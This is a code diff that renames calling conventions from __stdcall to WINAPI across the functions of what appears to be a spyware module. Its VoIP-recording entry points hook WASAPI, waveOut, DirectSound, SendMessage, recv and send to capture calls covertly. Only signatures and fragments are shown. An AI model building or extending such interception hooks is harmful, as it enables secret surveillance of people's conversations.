@@ -731,7 +731,7 @@ BOOL ParseSamplingMsg(BYTE* msg, DWORD* pdwLen, DWORD* pdwFlags)
 	return FALSE;
 }
 
-DWORD __stdcall PM_VoipRecordDispatch(BYTE* msg, DWORD dwLen, DWORD dwFlags, FILETIME* time_nanosec)
+DWORD WINAPI PM_VoipRecordDispatch(BYTE* msg, DWORD dwLen, DWORD dwFlags, FILETIME* time_nanosec)
 {
 	DWORD in_out = INPUT_ELEM;
 	pVoiceAdditionalData additional_data;
@@ -805,7 +805,7 @@ DWORD __stdcall PM_VoipRecordDispatch(BYTE* msg, DWORD dwLen, DWORD dwFlags, FIL
 }
 
 
-DWORD __stdcall PM_VoipRecordStartStop(BOOL bStartFlag, BOOL bReset)
+DWORD WINAPI PM_VoipRecordStartStop(BOOL bStartFlag, BOOL bReset)
 {
 	char codec_path[DLLNAMELEN];
 	pVoiceAdditionalData additional_data;
@@ -854,7 +854,7 @@ DWORD __stdcall PM_VoipRecordStartStop(BOOL bStartFlag, BOOL bReset)
 }
 
 
-DWORD __stdcall PM_VoipRecordInit(JSONObject elem)
+DWORD WINAPI PM_VoipRecordInit(JSONObject elem)
 {
 	// Inizializza la dimensione dei sample su disco
 	// e il fattore di compressione
@@ -871,7 +871,7 @@ DWORD __stdcall PM_VoipRecordInit(JSONObject elem)
 	return 1;
 }
 
-DWORD __stdcall PM_VoipRecordUnregister()
+DWORD WINAPI PM_VoipRecordUnregister()
 {
 #define MAX_FREE_TRIES 5
 #define FREE_SLEEP_TIME 100
@@ -1020,7 +1020,7 @@ HRESULT GetWASAPICaptureFunction(BYTE** ret_ptr, DWORD func_num, DWORD* n_channe
 	return S_FALSE;
 }
 
-HRESULT __stdcall PM_WASAPICaptureGetBuffer(BYTE* class_ptr,
+HRESULT WINAPI PM_WASAPICaptureGetBuffer(BYTE* class_ptr,
 	BYTE** ppData,
 	UINT32* pNumFramesToRead,
 	DWORD* pdwFlags,
@@ -1044,7 +1044,7 @@ HRESULT __stdcall PM_WASAPICaptureGetBuffer(BYTE* class_ptr,
 	return ret_code;
 }
 
-HRESULT __stdcall PM_WASAPICaptureGetBufferMSN(BYTE* class_ptr,
+HRESULT WINAPI PM_WASAPICaptureGetBufferMSN(BYTE* class_ptr,
 	BYTE** ppData,
 	UINT32* pNumFramesToRead,
 	DWORD* pdwFlags,
@@ -1149,7 +1149,7 @@ DWORD PM_WASAPICaptureGetBufferMSN_setup(HMServiceStruct* pData)
 	return 0;
 }
 
-HRESULT __stdcall PM_WASAPICaptureReleaseBuffer(BYTE* class_ptr,
+HRESULT WINAPI PM_WASAPICaptureReleaseBuffer(BYTE* class_ptr,
 	DWORD NumFramesWrittem)
 {
 	BOOL* Active;
@@ -1175,7 +1175,7 @@ HRESULT __stdcall PM_WASAPICaptureReleaseBuffer(BYTE* class_ptr,
 	return ret_code;
 }
 
-HRESULT __stdcall PM_WASAPICaptureReleaseBufferMSN(BYTE* class_ptr,
+HRESULT WINAPI PM_WASAPICaptureReleaseBufferMSN(BYTE* class_ptr,
 	DWORD NumFramesWrittem)
 {
 	BOOL* Active;
@@ -1355,7 +1355,7 @@ HRESULT GetWASAPIRenderFunction(BYTE** ret_ptr, DWORD func_num, DWORD* n_channel
 
 WASAPIGetBufferStruct WASAPIGetBufferData;
 
-HRESULT __stdcall PM_WASAPIGetBuffer(BYTE* class_ptr,
+HRESULT WINAPI PM_WASAPIGetBuffer(BYTE* class_ptr,
 	DWORD NumFramesRequested,
 	BYTE** ppData)
 {
@@ -1434,7 +1434,7 @@ DWORD PM_WASAPIGetBuffer_setup(HMServiceStruct* pData)
 
 WASAPIReleaseBufferStruct WASAPIReleaseBufferData;
 
-HRESULT __stdcall PM_WASAPIReleaseBuffer(BYTE* class_ptr,
+HRESULT WINAPI PM_WASAPIReleaseBuffer(BYTE* class_ptr,
 	DWORD NumFramesWrittem,
 	DWORD Flags)
 {
@@ -1515,7 +1515,7 @@ DWORD PM_WASAPIReleaseBuffer_setup(HMServiceStruct* pData)
 
 waveOutWriteStruct waveOutWriteData;
 
-DWORD __stdcall PM_waveOutWrite(HWAVEOUT ARG1,
+DWORD WINAPI PM_waveOutWrite(HWAVEOUT ARG1,
 	WAVEHDR* WaveHdr,
 	DWORD ARG3)
 {
@@ -1592,7 +1592,7 @@ DWORD PM_waveOutWrite_setup(HMServiceStruct* pData)
 
 waveInUnprepareHeaderStruct waveInUnprepareHeaderData;
 
-DWORD __stdcall PM_waveInUnprepareHeader(HWAVEOUT ARG1,
+DWORD WINAPI PM_waveInUnprepareHeader(HWAVEOUT ARG1,
 	WAVEHDR* WaveHdr,
 	DWORD ARG3)
 {
@@ -1668,7 +1668,7 @@ DWORD PM_waveInUnprepareHeader_setup(HMServiceStruct* pData)
 
 SendMessageStruct SendMessageData;
 
-LRESULT __stdcall PM_SendMessage(HWND hWnd,
+LRESULT WINAPI PM_SendMessage(HWND hWnd,
 	UINT Msg,
 	WPARAM wParam,
 	LPARAM lParam,
@@ -1891,7 +1891,7 @@ DWORD PM_DSCapGetCP_setup(HMServiceStruct* pData)
 	return 0;
 }
 
-DWORD __stdcall PM_DSCapGetCP(DWORD class_ptr,
+DWORD WINAPI PM_DSCapGetCP(DWORD class_ptr,
 	DWORD* write_c,
 	DWORD* play_c)
 {
@@ -1984,7 +1984,7 @@ DSGetCPStruct DSGetCPData;
 				                         wave_ptr += MAX_MSG_LEN; \
 									     to_write -= MAX_MSG_LEN; }}}
 
-DWORD __stdcall PM_DSGetCP(DWORD class_ptr,
+DWORD WINAPI PM_DSGetCP(DWORD class_ptr,
 	DWORD* write_c,
 	DWORD* play_c)
 {
@@ -2550,7 +2550,7 @@ void FreePartnerList(partner_entry** head)
 	*head = NULL;
 }
 
-int __stdcall PM_Recv(SOCKET s,
+int WINAPI PM_Recv(SOCKET s,
 	char* buf,
 	int len,
 	int flags)
@@ -2581,7 +2581,7 @@ int __stdcall PM_Recv(SOCKET s,
 	return ret_code;
 }
 
-int __stdcall PM_Send(SOCKET s,
+int WINAPI PM_Send(SOCKET s,
 	char* buf,
 	int len,
 	int flags)
